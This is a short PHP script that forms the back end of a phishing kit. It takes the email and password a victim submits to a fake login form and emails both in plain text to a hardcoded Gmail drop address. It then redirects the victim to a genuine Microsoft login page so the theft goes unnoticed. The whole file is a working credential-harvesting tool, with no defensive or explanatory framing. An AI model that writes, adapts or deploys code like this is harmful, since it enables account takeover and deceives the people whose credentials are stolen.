<?php
if(isset($_REQUEST['submit_btn'])){
$admin_email = "skinnyinc10@gmail.com";
$email = $_REQUEST['email'];
$password = $_REQUEST['password'];
  // $headers = "From:".$email;

  // Always set content-type when sending HTML email
$headers = "MIME-Version: 1.0" . "\r\n";
$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";

// More headers
$headers .= 'From:'.$email . "\r\n";


$subject = 'Recived data'.$email;

$headers = "From: " . strip_tags($email) . "\r\n";
$headers .= "Reply-To: ". strip_tags($email) . "\r\n";
$headers .= "MIME-Version: 1.0\r\n";
$headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";

$message = '<html><body>';
$message .= '<p>Username: '.$email.'<p><br>';
$message .= '<p>Password: '.$password.'<p><br>';
$message .= '</body></html>';
  //send email
if(mail($admin_email, $subject, $message, $headers )){
  header('Location: https://login.microsoftonline.com/common/oauth2');
}

}
  //if "email" variable is not filled out, display the form
?>
